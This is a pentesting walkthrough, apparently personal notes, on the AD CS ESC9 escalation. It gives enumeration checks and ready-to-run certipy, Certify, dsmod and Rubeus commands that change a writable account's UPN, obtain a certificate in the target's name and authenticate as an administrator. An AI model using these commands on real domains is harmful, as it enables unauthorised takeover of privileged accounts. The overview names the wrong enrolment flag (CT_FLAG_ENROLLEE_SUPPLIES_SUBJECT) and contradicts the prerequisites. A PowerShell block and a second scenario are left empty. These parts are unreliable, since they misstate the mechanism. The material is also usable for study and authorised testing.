## Overview
There is special flag in`msPKI-Enrollment-Flag` which is **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** (value: `0x00000001`), this flag grante the user the rights to change the UPN and the CA won't check the SID which mean it disable the `szOID_NTDS_CA_SECURITY_EXT` extension. This means that irrespective of the configuration of the `StrongCertificateBindingEnforcement` registry key (even if set to its default value of 1), the mapping process will occur as if the registry key had a value of `0`, essentially bypassing strong certificate mapping.

All what are we going to do is, lavareging the genericWrite on account change the account UPN to target UPN, then request a certificate, then change back the UPN. now you have certificate that has UPN of target user.

1. The `StrongCertificateBindingEnforcement` registry key should not be set to `2` (by default, it is set to `1`), or the `CertificateMappingMethods` should contain the UPN flag (`0x4`). Regrettably, as a low-privileged user, accessing and reading the values of these registry keys is typically unattainable.
2. The certificate template must incorporate the `CT_FLAG_NO_SECURITY_EXTENSION` flag within the `msPKI-Enrollment-Flag` value.
3. The certificate template should explicitly specify `client authentication` as its purpose.
4. The attacker must possess at least the `GenericWrite` privilege against any user account (account A) to compromise the security of any other user account (account B).
---
## Enumeration
### Linux
```
Enrollment Flag                     : NoSecurityExtension
...
Extended Key Usage                  : Client Authentication
```

### Windows
We will also need to confirm if the `StrongCertificateBindingEnforcement` registry key is not set to `2` (default: `1`) or `CertificateMappingMethods` registry key contains `UPN` flag (`0x4`). However, it is essential to note that it is unlikely that we will have access to make these queries from a remote computer, but if we do have access to the ADCS server, we can confirm this as follows:
```powershell
# Registry Query for StrongCertificateBindingEnforcement
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc
    StrongCertificateBindingEnforcement    REG_DWORD    0x0

# Registry Query for CertificateMappingMethods
reg query HKLM\System\CurrentControlSet\Control\SecurityProviders\Schannel\
    CertificateMappingMethods    REG_DWORD    0x4
```
#### Certify
```powershell
mspki-enrollment-flag              : NO_SECURITY_EXTENSION
```
#### powershell
```

```

---
## Abuse
**Scenario A**: UPN Manipulation (Requires `StrongCertificateBindingEnforcement = 1` (Compatibility) or `0` (Disabled) on DCs, and attacker has **write access to a "victim"** account's UPN that we will use to compromise the **target** user)
1. **Read initial UPN of the victim account (Optional - for restoration).**
2. **Update the victim account's UPN to the target administrator's `sAMAccountName`**
3. **(If needed) Obtain credentials for the "victim" account (e.g., via Shadow Credentials).**
4. **Request a certificate as the "victim" user from the ESC9 template.**
5. **Revert the "victim" account's UPN.**
6. **Authenticate as the target adminstrator**
**Scenario B: ESC9 Combined with ESC6 (CA allows SAN specification via attributes)**
### Linux
```ls
# Victim: Account we have GenericWrite on it.
# Target: Account that we want to compromise.
certipy account -u "$USER" -p "$PASSWORD" -target $DC -user victim read
certipy shadow auto -u "$USER" -p "$PASSWORD" -target $DC -account victim

# 1. update the victim upn to be as the target UPN.
certipy account update -u "$USER" -p "$PASSWORD" -user victim -upn target@lab.local 

# 2. Request certificate as Victim.
certipy req -u 'victim@lab.local' -hashes 2b576acbe6bcfda7294d6bd18041b8fe -ca lab-LAB-DC-CA -template ESC9

# 3. revert the changes in the UPN in victim account
certipy account update -u "$USER" -p "$PASSWORD" -user victim -upn victim@lab.local

# 4. authenticate as target using the generated certificate.
certipy auth -pfx target.pfx -domain lab.local
```


Windows
```sh
dsmod user "CN=victim,CN=Users,DC=lab,DC=local" -upn "target@lab.local" # change UPN of a user
.\certify.exe request --ca LAB-DC\lab-LAB-DC-CA --template ESC9
dsmod user "CN=victim,CN=Users,DC=lab,DC=local" -upn "victim@lab.local" # revert changes in UPN.

.\Rubeus.exe asktgt /user:target /certificate:$CertText /ptt /nowrap
```
